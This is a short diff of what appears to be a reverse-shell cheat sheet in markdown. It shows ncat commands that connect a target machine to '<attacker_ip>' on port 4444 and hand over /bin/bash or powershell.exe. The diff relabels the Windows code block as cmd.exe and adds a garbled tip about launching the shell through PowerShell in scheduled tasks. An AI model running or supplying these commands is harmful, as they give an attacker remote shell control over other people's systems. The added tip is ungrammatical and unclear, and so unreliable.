@@ -70,10 +70,10 @@ ncat <attacker_ip> 4444 -e /bin/bash
 
 **Target (PowerShell):**
 
-```powershell
+```cmd.exe
 ncat.exe <attacker_ip> 4444 -e powershell.exe
 ```
-
+ sometimes try launching it from power shell after input details incases of scheduled task
 ---
 
 ## 🔐 SSL Encrypted Shell
